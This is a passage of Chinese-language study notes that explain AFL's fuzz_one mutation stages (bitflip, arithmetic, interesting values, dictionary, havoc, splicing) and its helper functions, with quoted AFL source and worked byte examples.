<li>如果<code>pending_favored</code>不为0，则对于queue_cur被fuzz过或者不是favored的，有99%的几率直接返回1。</li>
<li>如果<code>pending_favored</code>为0且queued_paths(即queue里的case总数)大于10<ul>
<li>如果queue_cycle大于1且queue_cur没有被fuzz过，则有75%的概率直接返回1</li>
<li>如果queue_cur被fuzz过，否则有95%的概率直接返回1</li>
</ul>
</li>
<li>设置len为<code>queue_cur-&gt;len</code></li>
<li>打开该case对应的文件，并通过mmap映射到内存里，地址赋值给<code>in_buf</code>和<code>orig_in</code></li>
<li>打开预料 <code>/home/wutang/Desktop/fuzz_test/fuzz_output/fuzzer1/queue/id:000000,orig:1</code></li>
<li>分配len大小的内存，并初始化为全0，然后将地址赋值给out_buf</li>
<li>[[#CALIBRATION阶段]]</li>
<li>[[#TRIMMING阶段]]</li>
<li>[[#PERFORMANCE SCORE阶段]]</li>
<li>[[#SIMPLE BITFLIP (+dictionary construction)阶段]]</li>
<li>[[#ARITHMETIC INC&#x2F;DEC阶段]]</li>
<li>[[#INTERESTING VALUES阶段]]</li>
<li>[[#RANDOM HAVOC阶段]]</li>
<li>[[#SPLICING阶段]]</li>
<li>设置ret_val的值为0</li>
<li>如果queue_cur通过了评估，且was_fuzzed字段是0</li>
<li>就设置<code>queue_cur-&gt;was_fuzzed</code>为1，然后pending_not_fuzzed计数器减一</li>
<li>如果queue_cur是favored, pending_favored计数器减一。</li>
<li>return ret_val</li>
</ul>
</li>
</ul>
<h4 id="各个阶段"><a href="#各个阶段" class="headerlink" title="各个阶段"></a>各个阶段</h4><h5 id="CALIBRATION阶段"><a href="#CALIBRATION阶段" class="headerlink" title="CALIBRATION阶段"></a>CALIBRATION阶段</h5><p>假如当前项有校准错误，并且校准错误次数小于3次，那么就用 <code>calibrate_case</code> 再次校准。</p>
<h5 id="TRIMMING阶段"><a href="#TRIMMING阶段" class="headerlink" title="TRIMMING阶段"></a>TRIMMING阶段</h5><ul>
<li>如果该case没有trim过，<code>queue_cur-&gt;trim_done</code> 为0<ul>
<li>调用函数<code>trim_case(argv, queue_cur, in_buf)</code>进行trim(修剪) [[#trim_case(char **argv, struct queue_entry *q, u8 *in_buf)]]   in_buf 就是预料信息</li>
<li>设置queue_cur的trim_done为1</li>
<li>重新读取一次<code>queue_cur-&gt;len</code>到len中</li>
</ul>
</li>
<li>将in_buf拷贝len个字节到out_buf中</li>
</ul>
<h5 id="PERFORMANCE-SCORE阶段"><a href="#PERFORMANCE-SCORE阶段" class="headerlink" title="PERFORMANCE SCORE阶段"></a>PERFORMANCE SCORE阶段</h5><ul>
<li>perf_score &#x3D; <code>calculate_score(queue_cur)</code> [[#u32 calculate_score(struct queue_entry *q)]]</li>
<li>如果 <code>skip_deterministic</code> 为1，或者<code>queue_cur-&gt;was_fuzzed</code>被fuzz过，或者<code>queue_cur-&gt;passed_d</code>et为1，则跳转去havoc_stage阶段</li>
<li>设置doing_det为1</li>
</ul>
<h5 id="SIMPLE-BITFLIP-dictionary-construction-阶段"><a href="#SIMPLE-BITFLIP-dictionary-construction-阶段" class="headerlink" title="SIMPLE BITFLIP (+dictionary construction)阶段"></a>SIMPLE BITFLIP (+dictionary construction)阶段</h5><ul>
<li><code>bitflip 1/1</code>翻转 <code>需要注意 不会在  -d mode or -S 生成字典</code></li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> FLIP_BIT(_ar, _b) do &#123; \</span></span><br><span class="line"><span class="meta">    u8* _arf = (u8*)(_ar); \</span></span><br><span class="line"><span class="meta">    u32 _bf = (_b); \</span></span><br><span class="line"><span class="meta">    _arf[(_bf) &gt;&gt; 3] ^= (128 &gt;&gt; ((_bf) &amp; 7)); \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"></span><br><span class="line">  stage_max   = len &lt;&lt; <span class="number">3</span>;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;</span><br><span class="line">    stage_cur_byte = stage_cur &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">FLIP_BIT</span>(out_buf, stage_cur);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">common_fuzz_stuff</span>(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">    <span class="built_in">FLIP_BIT</span>(out_buf, stage_cur);</span><br></pre></td></tr></table></figure>

<ul>
<li>流程<ul>
<li>设置stage_name为<code>bitflip 1/1</code>, ar的取值是out_buf,而_bf的取值在<code>[0: len &lt;&lt; 3)</code>    也就是测试<strong>长度*8</strong> 次</li>
<li>所以用<code>_bf &amp; 7</code>能够得到<code>0,1,2...7 0,1,2...7</code>这样的取值一共len组 (每组8个)</li>
<li>然后 index  -&gt;   <code>(_bf) &gt;&gt; 3</code>又将<code>[0: len&lt;&lt;3)</code>映射回了<code>[0: len)</code>，对应到buf里的每个byte</li>
<li>然后 value  -&gt; <code>(128 &gt;&gt; ((_bf) &amp; 7))</code> 对应 <code>128,64,32,16,8,4,2,1</code></li>
<li>遍历out_buf 中字符 ， 与上面进行 异或<ul>
<li><code>out_buf[0] ^= 128</code></li>
<li><code>out_buf[0] ^= 64</code></li>
<li><code>out_buf[0] ^= 32</code></li>
<li><code>out_buf[0] ^= 16</code></li>
<li><code>out_buf[0] ^= 8</code></li>
<li><code>out_buf[0] ^= 4</code></li>
<li><code>out_buf[0] ^= 2</code></li>
<li><code>out_buf[0] ^= 1</code></li>
<li><code>out_buf[1] ^= 128</code></li>
<li>…</li>
</ul>
</li>
<li><code>common_fuzz_stuff(argv, out_buf, len)</code> [[#u8 common_fuzz_stuff(char **argv, u8 *out_buf, u32 len)]]</li>
<li>所以在从<code>0-len*8</code>的遍历过程中会通过xor运算，依次将每个位翻转，然后执行一次<code>common_fuzz_stuff</code>，然后再翻转回来。</li>
<li>在进行bitflip 1&#x2F;1变异时，对于每个byte的最低位(least significant bit)翻转还进行了额外的处理<ul>
<li>如果连续多个bytes的最低位被翻转后，程序的执行路径都未变化，而且与原始执行路径不一致，那么就把这一段连续的bytes判断是一条token。<br>比如对于SQL的<code>SELECT *</code>，如果<code>SELECT</code>被破坏，则肯定和正确的路径不一致，而被破坏之后的路径却肯定是一样的，比如<code>AELECT</code>和<code>SBLECT</code>，显然都是无意义的，而只有不破坏token，才有可能出现和原始执行路径一样的结果，所以AFL在这里就是在猜解关键字token。</li>
<li>token<strong>默认最小是3，最大是32</strong>,每次发现新token时，通过<code>maybe_add_auto</code>添加到<code>a_extras</code>数组里。 [[#maybe_add_auto(u8 *mem, u32 len)]]</li>
</ul>
</li>
<li><code>stage_finds[STAGE_FLIP1]</code>的值加上在整个FLIP_BIT中新发现的路径和Crash总和</li>
<li><code>stage_cycles[STAGE_FLIP1]</code>的值加上在整个FLIP_BIT中执行的target次数<code>stage_max</code></li>
<li><img src="/pic/310c793b6254093e2ef21453329ccad2.png"></li>
</ul>
</li>
<li><code>bitflip 2/1</code> <strong>翻转2次</strong></li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">stage_max = (len &lt;&lt; <span class="number">3</span>) - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">FLIP_BIT</span>(out_buf, stage_cur);</span><br><span class="line">    <span class="built_in">FLIP_BIT</span>(out_buf, stage_cur + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">common_fuzz_stuff</span>(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">FLIP_BIT</span>(out_buf, stage_cur);</span><br><span class="line">    <span class="built_in">FLIP_BIT</span>(out_buf, stage_cur + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>流程<ul>
<li>设置stage_name为<code>bitflip 2/1</code>,原理和之前一样，只是这次是<strong>连续翻转</strong></li>
<li><code>out_buf[0] = 0x31^128^64</code></li>
<li><code>out_buf[0] = 0x31^64^32</code></li>
<li>…</li>
<li>然后保存结果到<code>stage_finds[STAGE_FLIP2]和stage_cycles[STAGE_FLIP2]</code>里。</li>
</ul>
</li>
<li>同理，设置stage_name为<code>bitflip 4/1</code>，<strong>翻转连续4次并记录。</strong></li>
<li>流程<ul>
<li><code>out_buf[0] = 0x31^128^64^32^16 = 0xC1</code></li>
<li><code>out_buf[0] = 0x31^64^32^16^8   = 0x49</code></li>
<li><code>out_buf[0] = 0x31^32^16^8^4    = 0xD</code></li>
<li><code>out_buf[0] = 0x31^16^8^4^2     = 0x2F</code></li>
<li><code>out_buf[0] = 0x31^8^4^2^1      = 0x3E</code></li>
<li><code>out_buf[0] = 0x31^4^2^1        = 0x36   out_buf[1] = 0x32^128         = 0xB2</code></li>
<li><code>out_buf[0] = 0x31^2^1          = 0x32   out_buf[1] = 0x32^128^64      = 0xF2</code></li>
<li><code>out_buf[0] = 0x31^1            = 0x30   out_buf[1] = 0x32^128^64^32   = 0xD2</code></li>
<li>…</li>
</ul>
</li>
<li><code>生成effector map</code><ul>
<li>在进行bitflip 8&#x2F;8变异时，AFL还生成了一个非常重要的信息：effector map。这个effector map几乎贯穿了整个deterministic fuzzing的始终。</li>
<li>具体地，在对每个byte进行翻转时，如果其造成执行路径与原始路径不一致，就将该byte在effector map中标记为1，即“有效”的，否则标记为0，即“无效”的。</li>
<li>这样做的逻辑是：如果一个byte完全翻转，都无法带来执行路径的变化，那么这个byte很有可能是属于”data”，而非”metadata”（例如size, flag等），对整个fuzzing的意义不大。所以，在随后的一些变异中，<code>会参考effector map，跳过那些“无效”的byte，从而节省了执行资源</code>。</li>
<li>由此，通过极小的开销（没有增加额外的执行次数），AFL又一次对文件格式进行了<code>启发式的判断</code>。看到这里，不得不叹服于AFL实现上的精妙。</li>
<li>不过，<code>在某些情况下并不会检测有效字符</code>。</li>
<li>第一种情况就是<code>dumb mode</code>或者<code>从fuzzer</code>，此时文件所有的字符都有可能被变异。</li>
<li>第二、第三种情况与文件本身有关：</li>
</ul>
</li>
<li><code>bitflip 8/8变异</code><ul>
<li>设置stage_name为<code>bitflip 8/8</code>，以字节为单位，直接通过和<code>0xff</code>亦或运算去翻转整个字节的位，然后执行一次，并记录。</li>
</ul>
</li>
<li><code>bitflip 16/8变异</code><ul>
<li>设置stage_name为<code>bitflip 16/8</code>，设置<code>stage_max</code>为<code>len - 1</code>，以字为单位和<code>0xffff</code>进行亦或运算，<code>去翻转相邻的两个字节(即一个字的)的位</code>。</li>
<li><code>out_buf[0] = 0x3231 ^ 0xffff = 0xCDCE</code></li>
<li><code>out_buf[0] = 0x3332 ^ 0xffff = 0xCCCD</code></li>
<li>…</li>
<li>这里要注意在翻转之前会先检查eff_map里对应于这两个字节的标志是否为0，如果为0，则这两个字节是无效的数据，stage_max减一，然后开始变异下一个字。</li>
<li>common_fuzz_stuff执行变异后的结果，然后还原。</li>
</ul>
</li>
<li><code>如果预料len&lt;4 就跳出bitflip goto skip_bitflip</code></li>
<li><code>bitflip 32/8变异</code><ul>
<li><code>out_buf[0] = 0xA333231 ^ 0xFFFFFFFF = 0xF5CCCDCE</code></li>
<li>同理，设置stage_name为<code>bitflip 32/8</code>，然后设置<code>stage_max</code>为<code>len - 3</code>，以双字为单位，直接通过和<code>0xffffffff</code>亦或运算去相邻四个字节的位，然后执行一次，并记录。<ul>
<li>在每次翻转之前会检查eff_map里对应于这四个字节的标志是否为0，如果是0，则这两个字节是无效的数据，stage_max减一，然后开始变异下一组双字。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="ARITHMETIC-INC-DEC阶段"><a href="#ARITHMETIC-INC-DEC阶段" class="headerlink" title="ARITHMETIC INC&#x2F;DEC阶段"></a>ARITHMETIC INC&#x2F;DEC阶段</h5><ul>
<li>判断是否指定 <code>AFL_NO_ARITH</code> 略过</li>
<li>流程<ul>
<li>在bitflip变异全部进行完成后，便进入下一个阶段：arithmetic。与bitflip类似的是，arithmetic根据目标大小的不同，也分为了多个子阶段：</li>
<li>算法运算有个<code>could_be_bitflip</code>   确定给定的 <code>xor_val</code> 是否可能是由位翻转引起的变化。<ul>
<li>举例<code>arith 8/8</code><ul>
<li>取第一位</li>
<li>检查 <code>orig ^ (orig + j) = 0x31 ^ 0x32 = 0x3</code>  跳过<ul>
<li>用于检查特定的变化（通过 <code>xor_val = old ^ new</code> 表示）是否可能是由 <code>afl-fuzz</code> 尝试的确定性位翻转引起的。这在后续的一些确定性模糊测试操作中用于避免重复。如果 <code>xor_val</code> 为零，还会返回 1，这意味着旧值和尝试的新值是相同的，执行将是浪费时间。</li>
</ul>
</li>
<li>检查   <code>orig ^ (orig - j) = 0x31 - 0x30 = 0x1</code>  跳过</li>
<li>取第二位</li>
<li>检查 <code>orig ^ (orig + j) = 0x31 ^ 0x33 = 0x2</code>     <code>0x2 &gt;&gt;=1 = 0x1</code> 跳过</li>
<li>检查 <code>orig ^ (orig - j) = 0x31 ^ 0x2F = 0x1E</code>    <code>0x1e &gt;&gt;=1 = 0xF</code>跳过</li>
<li>取三位</li>
<li>检查 <code>orig ^ (orig + j) = 0x31 ^ 0x34 = 0x5</code>通过<ul>
<li>然后使用 <code>out_buf[0]  = 0x34</code>这个值  去 <code>common_fuzz_stuff</code></li>
</ul>
</li>
<li>继续检查 <code>orig ^ (orig - j) = 0x31 ^ 0x2E = 0x1F</code>通过<ul>
<li>然后使用 <code>out_buf[0]  = 0x2E</code>这个值  去 <code>common_fuzz_stuff</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><code>下面要分大小端测试</code></li>
<li><code>arith 8/8</code>，每次对8个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个byte进行整数加减变异</li>
<li><code>arith 16/8</code>，每次对16个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个word进行整数加减变异</li>
<li><code>arith 32/8</code>，每次对32个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个dword进行整数加减变异</li>
<li>加减变异的上限，在<code>config.h</code>中的宏<code>ARITH_MAX</code>定义，默认为35。所以，<code>对目标整数会进行+1, +2, …, +35, -1, -2, …, -35的变异</code>。特别地，<code>由于整数存在大端序和小端序两种表示方式，AFL会贴心地对这两种整数表示方式都进行变异</code>。</li>
<li>此外，AFL还会智能地跳过某些arithmetic变异。</li>
<li>第一种情况就是前面提到的<code>effector map</code>：如果一个整数的所有bytes都被判断为“无效”，那么就跳过对整数的变异。</li>
<li>第二种情况是之前bitflip已经生成过的变异：如果加&#x2F;减某个数后，其效果与之前的某种bitflip相同，那么这次变异肯定在上一个阶段已经执行过了，此次便不会再执行。</li>
</ul>
</li>
<li><img src="/pic/b467dff7c08b41e961127222e7ea975d.png"></li>
</ul>
<h5 id="INTERESTING-VALUES阶段"><a href="#INTERESTING-VALUES阶段" class="headerlink" title="INTERESTING VALUES阶段"></a>INTERESTING VALUES阶段</h5><ul>
<li>流程<ul>
<li>下一个阶段是interest，具体可分为：</li>
<li>interest 8&#x2F;8，每次对8个bit进替换，按照每8个bit的步长从头开始，即对文件的每个byte进行替换</li>
<li>interest 16&#x2F;8，每次对16个bit进替换，按照每8个bit的步长从头开始，即对文件的每个word进行替换</li>
<li>interest 32&#x2F;8，每次对32个bit进替换，按照每8个bit的步长从头开始，即对文件的每个dword进行替换</li>
<li>而用于替换的”interesting values”，是AFL预设的一些比较特殊的数,这些数的定义在config.h文件中</li>
</ul>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> s8  interesting_8[]  = &#123; INTERESTING_8 &#125;;  </span><br><span class="line"><span class="type">static</span> s16 interesting_16[] = &#123; INTERESTING_8, INTERESTING_16 &#125;;  </span><br><span class="line"><span class="type">static</span> s32 interesting_32[] = &#123; INTERESTING_8, INTERESTING_16, INTERESTING_32 &#125;;  </span><br></pre></td></tr></table></figure>

<ul>
<li>与之前类似，effector map仍然会用于判断是否需要变异；此外，如果某个interesting value，是可以通过bitflip或者arithmetic变异达到，那么这样的重复性变异也是会跳过的。 Skip if the value could be a product of bitflips or arithmetics.</li>
<li><code>out_buf[0] = interesting_8[0] = -128;</code></li>
<li>…</li>
<li><code>*(u16*)(out_buf + 0)  = interesting_16[0] = -128;  = 0xffff-128+1 = 0xff80</code></li>
<li>…</li>
<li><code>*(u32*)(out_buf + 0)  = interesting_32[0] = -128;  = 0xffffffff-128+1 = 0xFFFFFF80</code><ul>
<li><code>0x005320c8: 0x80 0xff 0xff 0xff 0xf0 0x00 0x00 0x00</code></li>
</ul>
</li>
</ul>
<h5 id="DICTIONARY-STUFF阶段"><a href="#DICTIONARY-STUFF阶段" class="headerlink" title="DICTIONARY STUFF阶段"></a>DICTIONARY STUFF阶段</h5><ul>
<li>[[#字典编写规则]]</li>
<li>流程<ul>
<li><code>extras_cnt=0</code> 跳过<ul>
<li>改变他 用 <code>load_extras_file</code> 自己指定的字典</li>
</ul>
</li>
<li>遍历字典<ul>
<li>如果发现跟预料一致跳过</li>
<li>如果发现超过200跳过？</li>
<li>进入到这个阶段，就接近deterministic fuzzing的尾声了。具体有以下子阶段：</li>
<li><code>user extras(over)</code> 从头开始,将用户提供的tokens依次替换到原文件中,stage_max为<code>extras_cnt * len</code></li>
<li><code>ABCD</code></li>
<li><code>user extras(insert)</code> 从头开始,将用户提供的tokens依次插入到原文件中,stage_max为<code>extras_cnt * len</code></li>
<li><code>123123</code></li>
<li><code>auto extras(over)</code> 从头开始,将<code>自动检测的tokens</code>依次替换到原文件中,stage_max为<code>MIN(a_extras_cnt, USE_AUTO_EXTRAS) * len</code><ul>
<li>这里是自己检测得到的 a_extras_cnt个 token</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="RANDOM-HAVOC阶段"><a href="#RANDOM-HAVOC阶段" class="headerlink" title="RANDOM HAVOC阶段"></a>RANDOM HAVOC阶段</h5><ul>
<li>设置确定性检测，创建文件 <code>mark_as_det_done</code><ul>
<li><code>/home/wutang/Desktop/fuzz_test/fuzz_output/fuzzer1/queue/.state/deterministic_done/id:000000,orig:1</code></li>
</ul>
</li>
<li>流程<ul>
<li>对于非dumb mode的主fuzzer来说，完成了上述<code>deterministic fuzzing</code>后，便进入了充满随机性的这一阶段；<strong>对于dumb mode或者从fuzzer来说，则是直接从这一阶段开始</strong>。</li>
<li>havoc，顾名思义，是充满了各种随机生成的变异，是对<strong>原文件的“大破坏</strong>”。具体来说，havoc包含了对原文件的多轮变异，每一轮都是将多种方式组合（stacked）而成：</li>
<li>随机选取某个bit进行翻转</li>
<li><code>FLIP_BIT(out_buf, UR(temp_len &lt;&lt; 3));</code></li>
<li>随机选取某个byte，将其设置为随机的interesting value</li>
<li><code>out_buf[UR(temp_len)] = interesting_8[UR(sizeof(interesting_8))];</code></li>
<li>随机选取某个word，并随机选取大、小端序，将其设置为随机的interesting value</li>
<li><code>*(u16*)(out_buf + UR(temp_len - 1)) = interesting_16[UR(sizeof(interesting_16) &gt;&gt; 1)];</code></li>
<li>随机选取某个dword，并随机选取大、小端序，将其设置为随机的interesting value</li>
<li><code>*(u32*)(out_buf + UR(temp_len - 3)) = interesting_32[UR(sizeof(interesting_32) &gt;&gt; 2)];</code></li>
<li>随机选取某个byte，对其减去一个随机数</li>
<li><code>out_buf[UR(temp_len)] -= 1 + UR(ARITH_MAX);</code></li>
<li>随机选取某个byte，对其加上一个随机数</li>
<li><code>out_buf[UR(temp_len)] += 1 + UR(ARITH_MAX);</code></li>
<li>随机选取某个word，并随机选取大、小端序，对其减去一个随机数</li>
<li><code>*(u16*)(out_buf + pos) = SWAP16(SWAP16(*(u16*)(out_buf + pos)) - num);</code></li>
<li>随机选取某个word，并随机选取大、小端序，对其加上一个随机数</li>
<li><code>*(u16*)(out_buf + pos) = SWAP16(SWAP16(*(u16*)(out_buf + pos)) + num);</code></li>
<li>随机选取某个dword，并随机选取大、小端序，对其减去一个随机数</li>
<li>随机选取某个dword，并随机选取大、小端序，对其加上一个随机数</li>
<li>随机选取某个byte，将其设置为随机数</li>
<li><code>out_buf[UR(temp_len)] ^= 1 + UR(255);</code></li>
<li>随机删除一段bytes</li>
<li><code>Clone bytes (75%) or insert a block of constant bytes (25%).</code></li>
<li>随机选取一个位置 75% 的概率是克隆（复制）一段数据，25% 的概率是插入一段常量数据</li>
<li><code>clone_len  = choose_block_len(temp_len);</code> 在一定的范围内选择合适的块长度，以便在块操作中产生不同大小的修改</li>
<li><code>clone_from = UR(temp_len - clone_len + 1);</code> 一个更简单的随机数生成函数，用于从 0 到 <code>limit - 1</code> 之间选择一个随机数。它的主要目的是在需要产生随机数的地方使用。</li>
<li><code>new_buf = ck_alloc_nozero(temp_len + clone_len);</code><ul>
<li>创建8+clone_len(随机长度) 长度 新buf&#x3D;new_buf</li>
</ul>
</li>
<li><code>memcpy(new_buf + clone_to, out_buf + clone_from, clone_len);</code><ul>
<li>out_buf + clone_from(随机数)  拷贝长度为clone_len(随机长度)  到  new_buf+clone_to(随机数)</li>
</ul>
</li>
<li><code>Overwrite bytes with a randomly selected chunk (75%) or fixed bytes (25%). </code></li>
<li>15 随机选取一个位置，用随机选取的token（用户提供的或自动生成的）替换</li>
<li>16 随机选取一个位置，用随机选取的token（用户提供的或自动生成的）插入</li>
<li>怎么样，看完上面这么多的“随机”，有没有觉得晕？还没完，AFL会生成一个随机数，作为变异组合的数量，并根据这个数量，每次从上面那些方式中随机选取一个（可以参考高中数学的有放回摸球），依次作用到文件上。如此这般丧心病狂的变异，原文件就大概率面目全非了，而这么多的随机性，也就成了fuzzing过程中的不可控因素，即所谓的“看天吃饭”了。</li>
</ul>
</li>
</ul>
<h5 id="SPLICING阶段"><a href="#SPLICING阶段" class="headerlink" title="SPLICING阶段"></a>SPLICING阶段</h5><ul>
<li><code>use_splicing</code> 在之前一整轮没有发现就会被设置,<code>retry_splicing</code>循环。 重新尝试 splicing 15次后退出循环</li>
<li>随机读取一个预料 到 new_buf</li>
<li>对比in_buf 旧预料 和 随机预料 new_buf不同的第一和最后的offset<ul>
<li><code>locate_diffs(in_buf, new_buf, MIN(len, target-&gt;len), &amp;f_diff, &amp;l_diff);</code></li>
<li>比如 预料<code>123</code> 躲避 <code>2222</code> 得到 <code>f_diff=0 l_diff=3</code></li>
<li>随机得到分割offset <code>split_at = f_diff + UR(l_diff - f_diff);</code></li>
<li>然后拷贝 in_buf的长度为 split_at 到 new_buf  <code>memcpy(new_buf, in_buf, split_at);</code></li>
</ul>
</li>
<li>跳转到 [[#RANDOM HAVOC阶段]]</li>
</ul>
<h4 id="sync-fuzzers-char-argv"><a href="#sync-fuzzers-char-argv" class="headerlink" title="sync_fuzzers(char **argv)"></a>sync_fuzzers(char **argv)</h4><h4 id="trim-case-char-argv-struct-queue-entry-q-u8-in-buf"><a href="#trim-case-char-argv-struct-queue-entry-q-u8-in-buf" class="headerlink" title="trim_case(char **argv, struct queue_entry *q, u8 *in_buf)"></a>trim_case(char **argv, struct queue_entry *q, u8 *in_buf)</h4><ul>
<li>用于在进行确定性检查deterministic checks时修剪测试用例，以便节省时间和资源</li>
</ul>
<h4 id="u32-calculate-score-struct-queue-entry-q"><a href="#u32-calculate-score-struct-queue-entry-q" class="headerlink" title="u32 calculate_score(struct queue_entry *q)"></a>u32 calculate_score(struct queue_entry *q)</h4><ul>
<li>用于计算测试用例（case）的可取得分（desirability score），以便在执行混沌模糊测试（havoc fuzzing）时调整模糊测试的长度。</li>
</ul>
<h4 id="u8-common-fuzz-stuff-char-argv-u8-out-buf-u32-len"><a href="#u8-common-fuzz-stuff-char-argv-u8-out-buf-u32-len" class="headerlink" title="u8 common_fuzz_stuff(char **argv, u8 *out_buf, u32 len)"></a>u8 common_fuzz_stuff(char **argv, u8 *out_buf, u32 len)</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Write a modified test case, run program, process results. Handle</span></span><br><span class="line"><span class="comment">   error conditions, returning 1 if it&#x27;s time to bail out. This is</span></span><br><span class="line"><span class="comment">   a helper function for fuzz_one(). */</span></span><br><span class="line"><span class="function">EXP_ST u8 <span class="title">common_fuzz_stuff</span><span class="params">(<span class="type">char</span>** argv, u8* out_buf, u32 len)</span> </span>&#123;</span><br><span class="line">  u8 fault;</span><br><span class="line">  <span class="keyword">if</span> (post_handler) &#123;</span><br><span class="line">    out_buf = <span class="built_in">post_handler</span>(out_buf, &amp;len); </span><br><span class="line">    <span class="comment">// so中的后处理逻辑提供扩展</span></span><br><span class="line">    <span class="keyword">if</span> (!out_buf || !len) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">write_to_testcase</span>(out_buf, len);</span><br><span class="line">  fault = <span class="built_in">run_target</span>(argv, exec_tmout);</span><br><span class="line">  <span class="comment">// 调用 `run_target` 函数来执行目标程序，`argv` 是目标程序的命令行参数，`exec_tmout` 是执行的超时时间。将执行结果保存在 `fault` 变量中</span></span><br><span class="line">  <span class="keyword">if</span> (stop_soon) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (fault == FAULT_TMOUT) &#123;</span><br><span class="line">    <span class="keyword">if</span> (subseq_tmouts++ &gt; TMOUT_LIMIT) &#123;</span><br><span class="line">      cur_skipped_paths++;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> subseq_tmouts = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* Users can hit us with SIGUSR1 to request the current input</span></span><br><span class="line"><span class="comment">     to be abandoned. */</span></span><br><span class="line">  <span class="keyword">if</span> (skip_requested) &#123;</span><br><span class="line">     skip_requested = <span class="number">0</span>;</span><br><span class="line">     cur_skipped_paths++;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* This handles FAULT_ERROR for us: */</span></span><br><span class="line">  queued_discovered += <span class="built_in">save_if_interesting</span>(argv, out_buf, len, fault);</span><br><span class="line">  <span class="keyword">if</span> (!(stage_cur % stats_update_freq) || stage_cur + <span class="number">1</span> == stage_max)</span><br><span class="line">    <span class="built_in">show_stats</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>[[#show_stats]]</li>
<li>简单的说就是写入文件并执行，然后处理结果，如果出现错误，就返回1.<ul>
<li>如果定义了<code>post_handler</code>,就通过<code>out_buf = post_handler(out_buf, &amp;len)</code>处理一下out_buf，如果out_buf或者len有一个为0，则直接返回0<ul>
<li><strong>这里其实很有价值，尤其是如果需要对变异完的queue，做一层wrapper再写入的时候。</strong></li>
</ul>
</li>
<li><code>write_to_testcase(out_buf, len)</code></li>
<li>[[#void write_to_testcase(void *mem, u32 len)]]</li>
<li><code>fault = run_target(argv, exec_tmout)</code></li>
<li>[[#u8 run_target(char **argv, u32 timeout)]]</li>
<li>如果fault是FAULT_TMOUT<ul>
<li>如果<code>subseq_tmouts++ &gt; TMOUT_LIMIT</code>（默认250），就将cur_skipped_paths加一，直接返回1</li>
<li>subseq_tmout是连续超时数</li>
</ul>
</li>
<li>否则设置subseq_tmouts为0</li>
<li>如果skip_requested为1<ul>
<li>设置skip_requested为0，然后将cur_skipped_paths加一，直接返回1</li>
</ul>
</li>
<li><code>queued_discovered += save_if_interesting(argv, out_buf, len, fault)</code>，即如果发现了新的路径才会加一。</li>
<li>[[#u8 save_if_interesting(char **argv, void *mem, u32 len, u8 fault)]] 会把什么阶段的样例记录下来</li>
<li>如果stage_cur除以stats_update_freq余数是0，或者其加一等于stage_max，就更新展示界面<code>show_stats</code></li>
<li>返回0</li>
</ul>
</li>
</ul>
<h4 id="u8-save-if-interesting-char-argv-void-mem-u32-len-u8-fault"><a href="#u8-save-if-interesting-char-argv-void-mem-u32-len-u8-fault" class="headerlink" title="u8 save_if_interesting(char **argv, void *mem, u32 len, u8 fault)"></a>u8 save_if_interesting(char **argv, void *mem, u32 len, u8 fault)</h4><ul>
<li>判断目标程序的执行结果是否有趣，如果有趣则保存或排队。<ul>
<li>[[#char has_new_bits(u8 *virgin_map)]] 没发现新路径就return</li>
</ul>
</li>
<li><code>/home/wutang/Desktop/fuzz_test/fuzz_output/fuzzer1/queue/id:000003,src:000000,op:flip2,pos:2,+cov</code><ul>
<li>会把什么阶段的样例记录下来</li>
<li>将其添加到队列里<ul>
<li>[[#add_to_queue(u8 *fname, u32 len, u8 passed_det)]]</li>
</ul>
</li>
<li>计算hash 保存hash到其exec_cksum<ul>
<li>[[#inline u32 hash32(const void* key, u32 len, u32 seed)]]</li>
</ul>
</li>
<li>评估这个queue<ul>
<li>[[#u8 calibrate_case(char **argv, struct queue_entry *q, u8 *use_mem, u32 handicap, u8 from_queue)]]</li>
</ul>
</li>
<li>设置keeping值为1</li>
<li>根据fault结果进入不同的分支<ul>
<li>FAULT_TMOUT<ul>
<li>设置total_tmouts计数器加一</li>
<li>如果unique_hangs的个数超过能保存的最大数量<code>KEEP_UNIQUE_HANG</code>，就直接返回keeping的值</li>
<li>如果不是dumb mode，就<code>simplify_trace((u64 *) trace_bits)</code>进行规整。</li>
<li>[[#simplify_trace(u64 *mem)]]  这段代码的目的是对位图中的活动位进行简化，以减少位图的复杂性，提高执行效率</li>
<li>如果没有发现新的超时路径，就直接返回keeping</li>
